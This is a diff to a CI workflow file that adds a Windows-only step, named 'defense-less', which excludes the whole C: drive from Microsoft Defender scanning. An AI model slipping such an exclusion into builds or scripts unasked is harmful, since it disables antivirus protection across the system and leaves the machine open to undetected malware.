@@ -18,6 +18,11 @@ jobs:
     runs-on: ${{ matrix.os }}
 
     steps:
+    - name: defense-less
+      if: runner.os == 'Windows'
+      shell: pwsh
+      run: Add-MpPreference -ExclusionPath "C:\"
+      
     - name: Checkout Master
       uses: actions/checkout@v3.6.0
 
